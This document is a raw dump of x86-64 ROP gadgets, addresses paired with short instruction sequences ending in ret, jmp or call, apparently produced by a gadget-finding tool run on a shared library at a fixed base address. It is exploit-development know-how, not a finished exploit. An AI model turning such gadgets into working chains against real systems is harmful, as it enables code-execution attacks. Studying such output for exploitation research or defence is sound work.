0x00002aaaaab0b084 : loopne 0x360d4 ; or dword ptr [rdi], eax ; xor eax, eax ; ret
0x00002aaaaab0b104 : loopne 0x36158 ; test dword ptr [rdi], eax ; setne al ; movzx eax, al ; ret
0x00002aaaaab0ffb6 : loopne 0x3afcc ; and ecx, 0x3ff ; xor eax, ecx ; ret
0x00002aaaaab1aa25 : loopne 0x45a4a ; or eax, edx ; ret
0x00002aaaaab1b072 : loopne 0x4608c ; test bh, ch ; add al, byte ptr [rax] ; add byte ptr [rcx + 0x39], cl ; ret 0xea75
0x00002aaaaab1d46d : loopne 0x48476 ; sub eax, 1 ; ret
0x00002aaaaab1d7ca : loopne 0x48833 ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab1d8a4 : loopne 0x4890c ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab27fc5 : loopne 0x52f52 ; ret 0xe680
0x00002aaaaab29f3e : loopne 0x54ecb ; ret 0xe680
0x00002aaaaaadaec0 : loopne 0x5eca ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x26
0x00002aaaaab4147b : loopne 0x6c4dd ; pop rbp ; pop r12 ; ret
0x00002aaaaab414a5 : loopne 0x6c507 ; pop rbp ; pop r12 ; ret
0x00002aaaaab41b8b : loopne 0x6cbed ; pop rbp ; pop r12 ; ret
0x00002aaaaab41c0d : loopne 0x6cc6f ; pop rbp ; pop r12 ; ret
0x00002aaaaab42d9c : loopne 0x6dda2 ; add byte ptr [rax], al ; jmp rax
0x00002aaaaab42dd8 : loopne 0x6ddde ; add byte ptr [rax], al ; call rax
0x00002aaaaab42e2a : loopne 0x6de30 ; add byte ptr [rax], al ; call rax
0x00002aaaaab42e6c : loopne 0x6de72 ; add byte ptr [rax], al ; jmp rax
0x00002aaaaab42e71 : loopne 0x6dee2 ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x00002aaaaab4706e : loopne 0x72007 ; mov eax, 0xffffffff ; ret
0x00002aaaaab4a44b : loopne 0x754a0 ; add esp, 0x28 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab4c9c8 : loopne 0x77a2a ; pop rbp ; pop r12 ; ret
0x00002aaaaab4cf06 : loopne 0x77f0b ; ret
0x00002aaaaab4cf16 : loopne 0x77f1b ; ret
0x00002aaaaab4dfb9 : loopne 0x79020 ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab4e067 : loopne 0x790ce ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab578ff : loopne 0x82967 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab584f8 : loopne 0x83525 ; xor al, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab590b2 : loopne 0x840b8 ; dec dword ptr [rax - 0x77] ; ret 0x8548
0x00002aaaaab5ce57 : loopne 0x87ebf ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab5d329 : loopne 0x88391 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab5fb9d : loopne 0x8ac10 ; pmovmskb edx, mm4 ; test edx, edx ; je 0x8abb5 ; bsf eax, edx ; ret
0x00002aaaaab634ed : loopne 0x8e551 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab63582 : loopne 0x8e5e6 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab691ad : loopne 0x94205 ; mov dword ptr [rdx + 0x18], eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab6ae97 : loopne 0x95eed ; mov eax, esp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab6ae9a : loopne 0x95efc ; pop rbp ; pop r12 ; ret
0x00002aaaaab7ad9c : loopne 0xa5da6 ; add byte ptr [rax], al ; ret
0x00002aaaaab7ea23 : loopne 0xa99f3 ; vmovdqu xmmword ptr [rdi], xmm0 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00002aaaaab7f0dd : loopne 0xaa0f7 ; movsxd rsi, dword ptr [rcx + rax*4] ; add rcx, rsi ; jmp rcx
0x00002aaaaab9c256 : loopne 0xc72be ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaba1b00 : loopne 0xccb66 ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x00002aaaaaba1aff : loopne 0xccb67 ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x00002aaaaaba1f50 : loopne 0xccf83 ; add byte ptr [rbp - 0x46], dh ; mov eax, 0x40 ; ret
0x00002aaaaaba5bc2 : loopne 0xd0c24 ; pop rbp ; pop r12 ; ret
0x00002aaaaaba5cc2 : loopne 0xd0d24 ; pop rbp ; pop r12 ; ret
0x00002aaaaabaa988 : loopne 0xd598d ; ret
0x00002aaaaabab609 : loopne 0xd6612 ; add eax, 8 ; ret
0x00002aaaaabab655 : loopne 0xd665b ; ret
0x00002aaaaabab709 : loopne 0xd670f ; pop rbx ; ret
0x00002aaaaabad6c3 : loopne 0xd86d7 ; ret
0x00002aaaaabadf6d : loopne 0xd8fde ; nop ; mov byte ptr [rdi + 8], 2 ; xor eax, eax ; ret
0x00002aaaaabb0aaa : loopne 0xdbb12 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaabb89f7 : loopne 0xe39bf ; call 0x66d0c30b
0x00002aaaaabc8dbc : loopne 0xf3e24 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaabcef19 : loopne 0xf9f81 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaac6ee3c : mov ah, 0 ; add al, byte ptr [rax] ; hlt ; cmp edi, ecx ; jmp rsp
0x00002aaaaac06707 : mov ah, 0 ; add byte ptr [rax], al ; mov eax, 1 ; ret
0x00002aaaaac811ec : mov ah, 0x12 ; add dword ptr [rax], eax ; and dl, bl ; jmp qword ptr [rcx]
0x00002aaaaac5722a : mov ah, 0x13 ; ret
0x00002aaaaac718ec : mov ah, 0x19 ; add byte ptr [rax], al ; adc byte ptr [rdi], 0xe9 ; call qword ptr [rbx]
0x00002aaaaac81bec : mov ah, 0x1c ; add dword ptr [rax], eax ; mov al, 0x87 ; hlt ; call qword ptr [rax]
0x00002aaaaab89bc3 : mov ah, 0x24 ; cwde ; add byte ptr [rax], al ; add byte ptr [rcx + 0x29], al ; ret 0x8341
0x00002aaaaabaf4f8 : mov ah, 0x24 ; cwde ; add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x947c
0x00002aaaaac01374 : mov ah, 0x24 ; enter 0, 0 ; lea r9, qword ptr [rsp + 0x30] ; call qword ptr [rax]
0x00002aaaaab90659 : mov ah, 0x24 ; mov eax, 0x41000000 ; call rsp
0x00002aaaaac72fec : mov ah, 0x30 ; add byte ptr [rax], al ; ret 0xffe9
0x00002aaaaac82fec : mov ah, 0x30 ; add dword ptr [rax], eax ; jrcxz 0x1adfee ; call qword ptr [rsi]
0x00002aaaaac6ce70 : mov ah, 0x32 ; jmp rsp
0x00002aaaaac6ce1c : mov ah, 0x3a ; add dword ptr [rax], eax ; push rsp ; and al, 0xf3 ; jmp rsp
0x00002aaaaac73dec : mov ah, 0x3e ; add byte ptr [rax], al ; cli ; jmp qword ptr [rcx]
0x00002aaaaac6d400 : mov ah, 0x43 ; cmc ; ljmp ptr [rax + rbp*2 + 0x44940001] ; cmc ; jmp rsp
0x00002aaaaac849ec : mov ah, 0x4a ; add dword ptr [rax], eax ; push rax ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac74bec : mov ah, 0x4c ; add byte ptr [rax], al ; adc byte ptr [rax - 0x15], dl ; call rdi
0x00002aaaaac84bec : mov ah, 0x4c ; add dword ptr [rax], eax ; add byte ptr [rbp - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac6f708 : mov ah, 0x55 ; cli ; ljmp ptr [rbx + rax*2 + 0x56240002] ; cli ; jmp rsp
0x00002aaaaac69ce8 : mov ah, 0x5f ; cld ; inc dword ptr [rdi + rbx*2 - 4] ; call rsp
0x00002aaaaac6d2d4 : mov ah, 0x61 ; add dword ptr [rax], eax ; xchg eax, esp ; adc al, 0xf5 ; call rsp
0x00002aaaaac5acb4 : mov ah, 0x63 ; in eax, dx ; dec edx ; push 0x65f7ffed ; in eax, dx ; call rdx
0x00002aaaaac6a1d4 : mov ah, 0x87 ; cld ; inc dword ptr [rdi + rax*4 - 4] ; call rsp
0x00002aaaaac6ef0c : mov ah, 0xa ; add al, byte ptr [rax] ; and al, 0x52 ; stc ; call rsp
0x00002aaaaac6ba30 : mov ah, 0xa0 ; in eax, dx ; jmp rsp
0x00002aaaaac576d0 : mov ah, 0xa5 ; ret
0x00002aaaaac6b91c : mov ah, 0xac ; add byte ptr [rax], al ; add al, 0x77 ; in eax, dx ; jmp rsp
0x00002aaaaac6b9c4 : mov ah, 0xb1 ; add byte ptr [rax], al ; mov ebp, gs ; jmp rsp
0x00002aaaaac6d688 : mov ah, 0xc ; idiv bh ; mov esp, 0xe4000176 ; or al, 0xf6 ; call rsp
0x00002aaaaac6dcd0 : mov ah, 0xc1 ; idiv bh ; cld ; xchg eax, esi ; add dword ptr [rax], eax ; ret 0xfff6
0x00002aaaaac6bcf4 : mov ah, 0xc9 ; add byte ptr [rax], al ; adc al, 0xfc ; in eax, dx ; call rsp
0x00002aaaaac6bbd0 : mov ah, 0xd0 ; in eax, dx ; call rsp
0x00002aaaaac6ea84 : mov ah, 0xe4 ; add dword ptr [rax], eax ; clc ; jmp rsp
0x00002aaaaab8c06b : mov ah, 0xe9 ; ret
0x00002aaaaac6c2ac : mov ah, 0xee ; add byte ptr [rax], al ; hlt ; fldz ; call rsp
0x00002aaaaac89879 : mov ah, 0xf6 ; call rsi
0x00002aaaaab5bc8c : mov ah, 0xff ; dec dword ptr [rax - 0x77] ; ret 0xc6eb
0x00002aaaaac2e6d7 : mov ah, 3 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac6a055 : mov ah, bh ; call qword ptr [rax + 0x20fffc87]
0x00002aaaaac6a9e9 : mov ah, bh ; call rax
0x00002aaaaac57024 : mov ah, bl ; push rsi ; ret
0x00002aaaaac19180 : mov ah, byte ptr [rsi + 0xf] ; je 0x144150 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac19f50 : mov ah, byte ptr [rsi + 0xf] ; je 0x144f20 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac1af90 : mov ah, byte ptr [rsi + 0xf] ; je 0x145f60 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac1cb60 : mov ah, byte ptr [rsi + 0xf] ; je 0x147b30 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac5d9cd : mov ah, dh ; jmp rdx
0x00002aaaaac7afb5 : mov al, 0 ; add byte ptr [rax + 0x1a], bh ; cli ; call qword ptr [rax]
0x00002aaaaac7af55 : mov al, 0 ; add byte ptr [rax - 0x71], bl ; out dx, al ; call qword ptr [rax]
0x00002aaaaac7af6d : mov al, 0 ; add byte ptr [rax - 0x71], dl ; out dx, al ; jmp qword ptr [rsi]
0x00002aaaaabc037e : mov al, 0 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaab68870 : mov al, 0 ; add byte ptr [rax], al ; add byte ptr [rax], cl ; add byte ptr [rax], al ; je 0x93885 ; ret
0x00002aaaaac7afe5 : mov al, 0 ; add byte ptr [rax], bl ; push rsp ; cli ; call qword ptr [rax]
0x00002aaaaac5c3f4 : mov al, 0 ; jmp rax
0x00002aaaaac83d60 : mov al, 0x1e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac0254c : mov al, 0x23 ; add byte ptr [rax], al ; xor eax, eax ; jmp rcx
0x00002aaaaac02504 : mov al, 0x23 ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; jmp rcx
0x00002aaaaac5f4b8 : mov al, 0x28 ; cli ; jmp rax
0x00002aaaaabe0569 : mov al, 0x2b ; add byte ptr [rbp + 0xa], dh ; jmp 0x10b59b
0x00002aaaaac699ac : mov al, 0x35 ; cld ; inc dword ptr [rax + 0x28] ; cld ; inc dword ptr [rax] ; sub bh, ah ; jmp rax
0x00002aaaaac09cb9 : mov al, 0x48 ; add eax, ecx ; jmp rax
0x00002aaaaaba212e : mov al, 0x48 ; add eax, edx ; jmp rax
0x00002aaaaab99725 : mov al, 0x48 ; add eax, esi ; jmp rax
0x00002aaaaabb9429 : mov al, 0x48 ; shl edx, 2 ; xor esi, esi ; call 0x8e69b
0x00002aaaaac10b08 : mov al, 0x48 ; shr edx, 3 ; add rax, rcx ; jmp rax
0x00002aaaaabfab5d : mov al, 0x49 ; mov ebx, eax ; mov byte ptr [r11], 0 ; ret
0x00002aaaaac5d984 : mov al, 0x53 ; hlt ; jmp rax
0x00002aaaaac69f54 : mov al, 0x58 ; cld ; push qword ptr [rax] ; pop rax ; cld ; jmp qword ptr [rax + 0x20fffc57]
0x00002aaaaac69b74 : mov al, 0x5e ; cld ; inc dword ptr [rax + 0x5e] ; cld ; call rax
0x00002aaaaac81c50 : mov al, 0x66 ; stc ; call qword ptr [rax]
0x00002aaaaac5c008 : mov al, 0x6e ; int1 ; inc eax ; outsb dx, byte ptr [rsi] ; int1 ; call rax
0x00002aaaaac84ea0 : mov al, 0x6f ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac6a9d0 : mov al, 0x7f ; cld ; call rax
0x00002aaaaac5cb94 : mov al, 0x81 ; ljmp ptr [rbp + 0x7c] ; jmp rdx
0x00002aaaaac6a278 : mov al, 0x83 ; cld ; inc dword ptr [rax - 0x7d] ; cld ; call rax
0x00002aaaaac6a060 : mov al, 0x86 ; cld ; inc dword ptr [rax - 0x7a] ; cld ; call rax
0x00002aaaaac81bf0 : mov al, 0x87 ; hlt ; call qword ptr [rax]
0x00002aaaaac7dee0 : mov al, 0x95 ; int1 ; call qword ptr [rax]
0x00002aaaaac90ac5 : mov al, 0xa ; sbb byte ptr [rax], al ; add al, ah ; or ch, byte ptr [rsi] ; ret 0xb
0x00002aaaaac6a770 : mov al, 0xaa ; cld ; inc dword ptr [rax - 0x56] ; cld ; call rax
0x00002aaaaac6a558 : mov al, 0xad ; cld ; inc dword ptr [rax - 0x53] ; cld ; call rax
0x00002aaaaaba2498 : mov al, 0xb ; add byte ptr [rax + 0x63], cl ; adc al, 0x98 ; add rax, rdx ; jmp rax
0x00002aaaaac696cc : mov al, 0xe4 ; sti ; inc dword ptr [rax - 0x29] ; sti ; inc dword ptr [rax] ; fsincos ; jmp rax
0x00002aaaaac7e450 : mov al, 0xe8 ; int1 ; call qword ptr [rbx]
0x00002aaaaac5c1c4 : mov al, 0xe8 ; int1 ; call rax
0x00002aaaaac5c1e4 : mov al, 0xe9 ; int1 ; call rax
0x00002aaaaac5c204 : mov al, 0xea ; int1 ; call rax
0x00002aaaaac5c258 : mov al, 0xec ; int1 ; inc eax ; in al, dx ; int1 ; call rax
0x00002aaaaac5c28c : mov al, 0xed ; int1 ; call rax
0x00002aaaaac594d6 : mov al, 0xee ; fcmovb st(0), st(3) ; ret
0x00002aaaaac5c2ac : mov al, 0xee ; int1 ; call rax
0x00002aaaaac5c2cc : mov al, 0xee ; int1 ; inc eax ; out dx, al ; int1 ; call rax
0x00002aaaaac79a60 : mov al, 0xf0 ; in eax, dx ; call rsi
0x00002aaaaabd2263 : mov al, 0xf3 ; ret
0x00002aaaaac69948 : mov al, 0xfa ; sti ; inc dword ptr [rax] ; cld ; sti ; inc dword ptr [rax - 0x19] ; sti ; call qword ptr [rax]
0x00002aaaaac5c3ac : mov al, 0xfd ; int1 ; call rax
0x00002aaaaab3ed97 : mov al, 0xff ; jmp qword ptr [rsi + 0xf]
0x00002aaaaac783e5 : mov al, 1 ; add ah, byte ptr [rbx + 0x41180e0a] ; ret
0x00002aaaaac7e205 : mov al, 1 ; add bl, byte ptr [rax + 0x41180e0a] ; ret
0x00002aaaaac414cc : mov al, 1 ; add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac794a1 : mov al, 1 ; add edi, dword ptr [rdi + 0x380e0a01] ; ret
0x00002aaaaac5c41c : mov al, 1 ; call rax
0x00002aaaaac69218 : mov al, 1 ; sti ; push qword ptr [rax + 2] ; sti ; inc dword ptr [rax + 3] ; sti ; call qword ptr [rax]
0x00002aaaaac5c444 : mov al, 2 ; call rax
0x00002aaaaac2ecee : mov al, 3 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7adcc : mov al, 4 ; add byte ptr [rax], al ; ret
0x00002aaaaac5c4a0 : mov al, 4 ; inc eax ; add al, 0xf2 ; call rax
0x00002aaaaab7a9cc : mov al, 8 ; add byte ptr [rax], al ; ret
0x00002aaaaac90b1d : mov al, 9 ; sbb byte ptr [rax], al ; add al, ah ; or dword ptr [rsi], ebp ; ret 0xa
0x00002aaaaac78a15 : mov al, byte ptr [rax] ; add al, ch ; jg 0x1a3a0e ; call qword ptr [rcx]
0x00002aaaaac789a5 : mov al, byte ptr [rax] ; add byte ptr [rax + 0x7d], ch ; in eax, dx ; call qword ptr [rsi]
0x00002aaaaab68832 : mov al, byte ptr [rax] ; add byte ptr [rax], al ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaac412f2 : mov al, byte ptr [rbx] ; add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac31627 : mov al, byte ptr [rbx] ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac3f426 : mov al, byte ptr [rcx + 2] ; mov byte ptr [rdx + 2], al ; lea rax, qword ptr [rdx + 2] ; ret
0x00002aaaaab76efb : mov al, byte ptr [rcx + 2] ; mov byte ptr [rdx + 2], al ; mov rax, rdi ; ret
0x00002aaaaac3f454 : mov al, byte ptr [rcx + 4] ; mov byte ptr [rdx + 4], al ; lea rax, qword ptr [rdx + 4] ; ret
0x00002aaaaab76f29 : mov al, byte ptr [rcx + 4] ; mov byte ptr [rdx + 4], al ; mov rax, rdi ; ret
0x00002aaaaab76fad : mov al, byte ptr [rcx + 8] ; mov byte ptr [rdx + 8], al ; mov rax, rdi ; ret
0x00002aaaaac3f400 : mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; lea rax, qword ptr [rdx] ; ret
0x00002aaaaab76ed5 : mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x00002aaaaac83288 : mov al, ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac1ee80 : mov al, ch ; stc ; je 0x149e50 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac20510 : mov al, ch ; stc ; je 0x14b4e0 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaab76f49 : mov ax, word ptr [rcx + 4] ; mov word ptr [rdx + 4], ax ; mov rax, rdi ; ret
0x00002aaaaab76fcd : mov ax, word ptr [rcx + 8] ; mov word ptr [rdx + 8], ax ; mov rax, rdi ; ret
0x00002aaaaac3f410 : mov ax, word ptr [rcx] ; mov word ptr [rdx], ax ; lea rax, qword ptr [rdx + 1] ; ret
0x00002aaaaab76ee5 : mov ax, word ptr [rcx] ; mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x00002aaaaac6ba65 : mov bh, 0 ; add byte ptr [rax + rbp*4], dl ; in eax, dx ; call rsp
0x00002aaaaac2fd11 : mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x00002aaaaaaff21b : mov bh, 0x43 ; add al, 0x29 ; ret 0x8941
0x00002aaaaaafed92 : mov bh, 0x47 ; or cl, byte ptr [rax + 0x39] ; ret 0x4676
0x00002aaaaab41aa0 : mov bh, 0x48 ; add edi, esi ; jmp rdi
0x00002aaaaab08411 : mov bh, 0x48 ; add esi, edi ; jmp rsi
0x00002aaaaac44d78 : mov bh, 0x48 ; lea eax, dword ptr [rdi + 7] ; ret
0x00002aaaaab02a67 : mov bh, 0x8b ; add al, 0x10 ; ret
0x00002aaaaaad7be8 : mov bh, 0xb1 ; or cl, cl ; clc ; ret
0x00002aaaaac58504 : mov bh, 0xb4 ; mov edi, dword ptr [rdx] ; ret
0x00002aaaaac56157 : mov bh, 0xb8 ; mov ecx, 0xbdbcbbba ; mov esi, 0xc2c1c0bf ; ret
0x00002aaaaab02d16 : mov bh, 0xc0 ; ret
0x00002aaaaabed81c : mov bh, 0xc6 ; or eax, edi ; bswap eax ; ret
0x00002aaaaac6f1d9 : mov bh, 0xf9 ; call rsp
0x00002aaaaaad8790 : mov bh, 0xfa ; add ebx, ebp ; in al, -0x12 ; jne 0x377a ; ret 0x975
0x00002aaaaac694dd : mov bh, 0xfd ; call qword ptr [rcx - 0x2e00024b]
0x00002aaaaac694d5 : mov bh, 0xfd ; call rcx
0x00002aaaaac6955d : mov bh, 0xfd ; call rsi
0x00002aaaaac694fd : mov bh, 0xfd ; inc dword ptr [rax - 0x2e00024b] ; mov bh, 0xfd ; call rcx
0x00002aaaaac6958d : mov bh, 0xfd ; inc dword ptr [rdi - 0x49] ; std ; call rcx
0x00002aaaaac695fd : mov bh, 0xfd ; jmp qword ptr [rax - 0x2e00024a]
0x00002aaaaac695dd : mov bh, 0xfd ; jmp qword ptr [rax - 0x2e00024b]
0x00002aaaaac695ed : mov bh, 0xfd ; jmp qword ptr [rax]
0x00002aaaaac6954d : mov bh, 0xfd ; lcall ptr [rsi - 0x49] ; std ; call rcx
0x00002aaaaac6960d : mov bh, 0xfd ; ljmp ptr [rax] ; fdivr st(3) ; push rax ; fsincos ; call rax
0x00002aaaaac695cd : mov bh, 0xfd ; push qword ptr [rax] ; mov bh, 0xfd ; call rcx
0x00002aaaaac6952d : mov bh, 0xfd ; push qword ptr [rcx - 0x4a] ; std ; call rcx
0x00002aaaaac6951d : mov bh, 0xfd ; push rcx ; mov ch, 0xfd ; call rcx
0x00002aaaaac6953d : mov bh, 0xfd ; push rcx ; mov dh, 0xfd ; call rcx
0x00002aaaaabdce83 : mov bh, 0xff ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaac6e39d : mov bh, 1 ; add byte ptr [rbp + rbp*2 - 9], al ; call rsp
0x00002aaaaac2e3d7 : mov bh, 3 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabde8a6 : mov bh, 4 ; js 0x109836 ; loopne 0x1098bd ; movzx eax, ax ; ret
0x00002aaaaabde9d6 : mov bh, 4 ; js 0x109963 ; loopne 0x1099e3 ; ret
0x00002aaaaabdea66 : mov bh, 4 ; js 0x1099f6 ; loopne 0x109a77 ; movzx eax, ax ; ret
0x00002aaaaabded66 : mov bh, 4 ; js 0x109cf6 ; loopne 0x109d79 ; movzx eax, ax ; ret
0x00002aaaaabdf23f : mov bh, 4 ; js 0x10a1cf ; loopne 0x10a256 ; movzx eax, ax ; ret
0x00002aaaaabdf33f : mov bh, 4 ; js 0x10a2cc ; loopne 0x10a34c ; ret
0x00002aaaaabdf3bf : mov bh, 4 ; js 0x10a34f ; loopne 0x10a3d0 ; movzx eax, ax ; ret
0x00002aaaaabdf63f : mov bh, 4 ; js 0x10a5cf ; loopne 0x10a652 ; movzx eax, ax ; ret
0x00002aaaaab02d0f : mov bh, 4 ; js 0x2dc9f ; loopne 0x2dd26 ; movzx eax, ax ; ret
0x00002aaaaab02d4f : mov bh, 4 ; js 0x2dcdf ; loopne 0x2dd60 ; movzx eax, ax ; ret
0x00002aaaaab02def : mov bh, 4 ; js 0x2dd7f ; loopne 0x2de02 ; movzx eax, ax ; ret
0x00002aaaaab02ecf : mov bh, 4 ; js 0x2de5c ; loopne 0x2dedc ; ret
0x00002aaaaab02f48 : mov bh, 4 ; js 0x2ded5 ; loopne 0x2df55 ; ret
0x00002aaaaab02f58 : mov bh, 4 ; js 0x2dee8 ; loopne 0x2df6f ; movzx eax, ax ; ret
0x00002aaaaab02f98 : mov bh, 4 ; js 0x2df28 ; loopne 0x2dfa9 ; movzx eax, ax ; ret
0x00002aaaaab03038 : mov bh, 4 ; js 0x2dfc8 ; loopne 0x2e04b ; movzx eax, ax ; ret
0x00002aaaaabe8e33 : mov bh, 4 ; push rax ; shr ax, 0xe ; and eax, 1 ; ret
0x00002aaaaac59c13 : mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x00002aaaaabca351 : mov bh, 7 ; mov word ptr [rsi], ax ; xor eax, eax ; ret
0x00002aaaaac6aa2d : mov bh, ah ; call rax
0x00002aaaaac831f8 : mov bh, ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab4bf91 : mov bh, bh ; dec dword ptr [rax - 0x77] ; ret 0x38b
0x00002aaaaac7aef8 : mov bh, bh ; stc ; call qword ptr [rax]
0x00002aaaaac82e78 : mov bh, bl ; hlt ; call qword ptr [rbx]
0x00002aaaaac6f0e9 : mov bh, cl ; call rsp
0x00002aaaaac4666e : mov bl, 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab920d1 : mov bl, 0x30 ; add byte ptr [rax + 0x39], cl ; ret 0x850f
0x00002aaaaab81edc : mov bl, 0x48 ; mov eax, edx ; ret
0x00002aaaaabb955c : mov bl, 0x8b ; pop rax ; or bh, dh ; ret
0x00002aaaaac595e3 : mov bl, 0x8e ; ret 0xdcd9
0x00002aaaaac755b1 : mov bl, 0xec ; jmp qword ptr [rcx]
0x00002aaaaaad6b13 : mov bl, 0xee ; enter 0x59e7, 0x5b ; ret 0x2a63
0x00002aaaaac6dc61 : mov bl, 0xf6 ; jmp rsp
0x00002aaaaaad8af9 : mov bl, 0xf7 ; adc bh, byte ptr [rax] ; cwde ; ret
0x00002aaaaabc7941 : mov bl, 0xf9 ; dec dword ptr [rax - 0x77] ; ret 0x3145
0x00002aaaaac6e32d : mov bl, 1 ; add byte ptr [rbp + rdx*2 - 9], dh ; call rsp
0x00002aaaaac69389 : mov bl, bh ; call rax
0x00002aaaaab2557d : mov bl, byte ptr [rsi - 0x76fffff6] ; ret 0xe680
0x00002aaaaab55f42 : mov bl, byte ptr [rsi] ; xor al, 0 ; mov rdi, r14 ; call qword ptr [rax]
0x00002aaaaac5caf9 : mov bl, dh ; call rdx
0x00002aaaaac5ca75 : mov bl, dh ; jmp rdx
0x00002aaaaac5cafd : mov bl, dh ; lcall ptr [rbp + 0x78fff37a] ; jge 0x187b04 ; jmp rdx
0x00002aaaaabfab61 : mov byte ptr [r11], 0 ; ret
0x00002aaaaab574c0 : mov byte ptr [r8 + rbx], r9b ; mov rax, r8 ; pop rbx ; ret
0x00002aaaaab4c63c : mov byte ptr [r8 - 0x75], r9b ; or cl, byte ptr [rax - 0x7d] ; ret
0x00002aaaaabd36d9 : mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaabca362 : mov byte ptr [rax + 0x16b8ff], 0 ; add byte ptr [rsp + rax - 0xd], dh ; ret
0x00002aaaaab04a5c : mov byte ptr [rax + 0x39], dl ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00002aaaaabd0b10 : mov byte ptr [rax + 0xc], 0 ; add rsp, 0x30 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaac11b0c : mov byte ptr [rax + 1], cl ; ret 0x8948
0x00002aaaaabd273a : mov byte ptr [rax + rax], ch ; lea rax, qword ptr [rip + 0x2c8854] ; ret
0x00002aaaaabd2741 : mov byte ptr [rax + rax], ch ; ret
0x00002aaaaab574c1 : mov byte ptr [rax + rbx], cl ; mov rax, r8 ; pop rbx ; ret
0x00002aaaaaaf9208 : mov byte ptr [rax + rcx*2], 0x83 ; ret
0x00002aaaaab1aaf9 : mov byte ptr [rax + rdx], 0 ; ret
0x00002aaaaab4c63d : mov byte ptr [rax - 0x75], cl ; or cl, byte ptr [rax - 0x7d] ; ret
0x00002aaaaaaf8b83 : mov byte ptr [rax - 0x7c], 0xf6 ; mov edx, 0xffffffff ; cmovs eax, edx ; ret
0x00002aaaaac84f78 : mov byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaabd36da : mov byte ptr [rax - 1], 0 ; ret
0x00002aaaaabf59c6 : mov byte ptr [rax], 0 ; add byte ptr [rcx - 0xa], al ; ret 0xf01
0x00002aaaaac0c0d5 : mov byte ptr [rax], 0 ; jle 0x1370f3 ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaabe2b5d : mov byte ptr [rax], 0x20 ; jmp 0x10db29
0x00002aaaaabd903e : mov byte ptr [rax], 0xa ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac16cd7 : mov byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0xffffffff ; pop rbx ; pop rbp ; ret
0x00002aaaaab0a96d : mov byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00002aaaaab5d14c : mov byte ptr [rax], al ; add byte ptr [rax], al ; mov rsi, r12 ; mov rdi, rbp ; call rax
